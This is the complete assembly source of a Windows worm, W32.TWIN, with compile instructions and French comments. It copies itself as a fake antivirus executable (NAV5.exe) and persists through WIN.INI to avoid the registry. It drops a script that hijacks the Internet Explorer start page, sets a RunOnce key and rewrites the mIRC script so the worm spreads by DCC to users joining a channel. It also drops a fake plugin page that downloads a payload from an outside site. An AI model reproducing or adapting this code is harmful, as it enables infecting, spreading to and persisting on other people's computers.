comment $

W32.TWIN par PetiK le 20/12/2000

POUR COMPILER:

tasm32 /M /ML ?????.asm
tlink32 -Tpe -x -aa ?????.obj,,,import32

$

.386
jumps
locals
.model flat, stdcall

;KERNEL32.dll
extrn lstrcat:PROC
extrn WritePrivateProfileStringA:PROC
extrn GetModuleFileNameA:PROC
extrn CopyFileA:PROC
extrn CreateFileA:PROC
extrn WriteFile:PROC
extrn CloseHandle:PROC
extrn ExitProcess:PROC
extrn GetModuleHandleA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetWindowsDirectoryA:PROC

;USER32.dll
extrn MessageBoxA:PROC

;ADVAPI32.dll
extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC

.data
fh      dd ?
octets  dd ?
regDisp dd 0
regResu	dd 0
l       dd 0
p       dd 0
szBAT   db 260 dup (0)
szCopie db 260 dup (0)
szOrig	db 260 dup (0)
szHTM   db 260 dup (0)
szVBS	db 260 dup (0)
szWin	db 260 dup (0)
Copie	db "\NAV5.exe",00h
BATFILE db "\IE55.bat",00h
HTMFILE db "\IE55.htm",00h
VBSFILE	db "\IE55.vbs",00h
Winini	db "\\WIN.INI",00h
run	db "run",00h
windows	db "windows",00h
CLE     db "Software\[PetiK]",00h
CLE2	db "\Software\Microsoft\Internet Explorer\Main",00h
NOM2    db "Start Page",00h


vbsd:
db 'rem IE55.vbs pour W32.TWiN',0dh,0ah
db '',0dh,0ah
db 'Dim fso,ws,file',0dh,0ah
db 'Set fso  = CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'Set ws   = CreateObject("WScript.Shell")',0dh,0ah
db 'DEBUT()',0dh,0ah
db 'Sub DEBUT()',0dh,0ah
db 'Set win  = fso.GetSpecialFolder(0)',0dh,0ah
db 'Set sys  = fso.GetSpecialFolder(1)',0dh,0ah
db 'ws.Run (sys&"\IE55.htm")',0dh,0ah
db 'ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\'
db 'Download Directory","C:\"',0dh,0ah
db 'If fso.FileExists("C:\PlugIE55.exe") Then',0dh,0ah
db 'ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\'
db 'Start Page","http://www.atoutmicro.ca/viralert.htm"',0dh,0ah
db 'ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\'
db 'PlugIE55","C:\PlugIE55.exe"',0dh,0ah
db 'End If',0dh,0ah
db 'MIRC()',0dh,0ah
db 'End Sub',0dh,0ah
db '',0dh,0ah
db 'Sub MIRC()',0dh,0ah
db 'On Error Resume Next',0dh,0ah
db 'If fso.FileExists("C:\mirc\script.ini") Then',0dh,0ah
db ' Set c    = (sys&"\NAV5.exe")',0dh,0ah
db ' c.Copy("C:\mirc\XPICTURE.exe")',0dh,0ah
db ' Set srpt = fso.CreateTextFile("C:\mirc\script.ini",true)',0dh,0ah
db ' srpt.WriteLine  "[script]"',0dh,0ah
db ' srpt.WriteLine  "n0=on 1:JOIN:#:{"',0dh,0ah
db ' srpt.WriteLine  "n1= /if ( $nick == $me ) { halt }"',0dh,0ah
db ' srpt.WriteLine  "n2= /.dcc send $nick C:\mirc\XPICTURE.exe"',0dh,0ah
db ' srpt.WriteLine  "n3=}"',0dh,0ah
db ' srpt.Close',0dh,0ah
db 'End If',0dh,0ah
db 'End Sub',0dh,0ah
vbstaille       equ $-vbsd

htmd:
db '<HTML><HEAD>',0dh,0ah
db '<TITLE>Plugin pour Internet Explorer / '
db 'Plugin for Internet Explorer</TITLE>',0dh,0ah
db '<SCRIPT language="JavaScript">',0dh,0ah
db 'site="http://www.multimania.com/kadosh/PlugIE55.exe ";',0dh,0ah
db 'temps = 10;',0dh,0ah
db '',0dh,0ah
db 'function affiche()',0dh,0ah
db '{ if (temps-- == 0) ',0dh,0ah
db '  { clearInterval(attente);',0dh,0ah
db '    location.href=site;',0dh,0ah
db '    return;',0dh,0ah
db '  }',0dh,0ah
db '  document.forms[0].elements[0].value = temps;',0dh,0ah
db '}',0dh,0ah
db '</SCRIPT>',0dh,0ah
db ' ',0dh,0ah
db '</HEAD>',0dh,0ah
db '<BODY bgColor=black text=red onload='''attente = setInterval'
db '("affiche()", 1000);'''>',0dh,0ah
db '<DIV align=center>',0dh,0ah
db '<H1>Plugin pour Microsoft Internet Explorer</H1>',0dh,0ah
db '<H1>Plugin for Microsoft Internet Explorer</H1>',0dh,0ah
db '</DIV>',0dh,0ah
db '<DIV align=left>',0dh,0ah
db '<HR SIZE=4>',0dh,0ah
db '<H3>Merci de télécharger le plugin dans le réperoire C:\</H3>',0dh,0ah
db '<H3>Please download the plugin in C:\ path</H3>',0dh,0ah
db '<HR SIZE=1>',0dh,0ah
db '</DIV>v
db '<DIV align=center>',0dh,0ah
db '<FORM><BIG>Téléchargement dans <INPUT size=1 value=8> secondes</BIG>',0dh,0ah
db '</FORM></DIV></BODY></HTML>',0dh,0ah
htmtaille       equ $-htmd

batd:
db '@echo off',0dh,0ah
db 'start C:\WINDOWS\SYSTEM\IE55.vbs',00h
battaille       equ $-batd

.code
DEBUT:  mov  eax, offset CLE            ; Vérifie si il existe une clé
        call REG                        ; [PetiK] dans HKLM\Software.
        cmp  [regDisp],1                ; Si elle n'y est pas, il se copie
        jne  FIN                        ; puis modifie le fichier WIN.INI

WCOPIE: push 0                          ;
        call GetModuleHandleA           ;
        push 260                        ; Le programme se copie dans le 
        push offset szOrig              ;
        push eax                        ;
        call GetModuleFileNameA         ; dossier WINDOWS de l'ordinateur
        push 260                        ;
        push offset szCopie             ; et se nommera NAV5.exe
        call GetWindowsDirectoryA       ;
        push offset Copie               ;
        push offset szCopie             ;
        call lstrcat                    ;
        push 0                          ;
        push offset szCopie             ;
        push offset szOrig              ;
        call CopyFileA                  ;

WIN_INI:push 260                        ; On met dans le fichier WIN.INI
        push offset szWin               ; une routine pour que le programme
        call GetWindowsDirectoryA       ; s'active à chaque démarrage.
        push offset Winini              ; Cela évite d'utiliser la BASE DE
        push offset szWin               ; REGISTRE trop voyante.
        call lstrcat                    ; 
        push offset szWin               ; Dans WIN.INI du dossier WINDOWS
        push offset szCopie             ; "nom du programme"
        push offset run                 ; run=
        push offset windows             ; [windows]
        call WritePrivateProfileStringA ;

BAT:    push 260                        ; 
        push offset szBAT               ;
        call GetSystemDirectoryA        ; 
        push offset BATFILE             ;
        push offset szBAT               ; 
        call lstrcat                    ;
        push 00000000h                  ;
        push 00000080h                  ;
        push 00000002h                  ;
        push 00000000h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset szBAT               ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push battaille                  ;
        push offset batd                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;

VBS:    push 260                        ; On va créer un fichier 
        push offset szVBS               ;
        call GetSystemDirectoryA        ; dans le réperoire SYSTEM
        push offset VBSFILE             ;
        push offset szVBS               ; qui s'appelle IE55.VBS
        call lstrcat                    ;
        push 00000000h                  ;
        push 00000080h                  ;
        push 00000002h                  ;
        push 00000000h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset szVBS               ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push vbstaille                  ;
        push offset vbsd                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;

HTM:    push 260                        ; On va créer un fichier 
        push offset szHTM               ;
        call GetSystemDirectoryA        ; dans le réperoire SYSTEM
        push offset HTMFILE             ;
        push offset szHTM               ; qui s'appelle IE55.HTM
        call lstrcat                    ;
        push 00000000h                  ;
        push 00000080h                  ;
        push 00000002h                  ;
        push 00000000h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset szHTM               ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push htmtaille                  ;
        push offset htmd                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;

BDR:    push offset l			;
	push offset p                   ;
        push 0                          ;
        push 1F0000h + 1 + 2h           ;
        push 0                          ;
        push 0                          ;
        push 0                          ;
        push offset CLE2                ;
        push 80000001h                  ; HKEY_CURRENT_USER
        call RegCreateKeyExA            ;
        push 05h                        ;
        push offset szVBS               ; On va créer une clé dans la
        push 01h                        ;
        push 0                          ; 
        push offset NOM2                ; Base de Registre pour qu'il
        push p                          ;
        call RegSetValueExA             ;
        push 0                          ; active le fichier VBS quand on
        call RegCloseKey                ; va sur internet
	jmp FIN				;

REG:    push offset regDisp             ;
     	push offset regResu		;
     	push 0         			; default security descriptor
     	push 0F003FH   			; KEY_ALL_ACCESS
     	push 0         			; 
     	push 0				;
     	push 0				;
     	push eax       			; adresse de la sous-CLE
     	push 80000002h 			; HKEY_LOCAL_MACHINE 
     	call RegCreateKeyExA		;
	push [regResu]                  ; 
        call RegCloseKey                ;
	ret				;

FIN:    push 0                          ; 
        call ExitProcess                ; Fin du Programme

end DEBUT
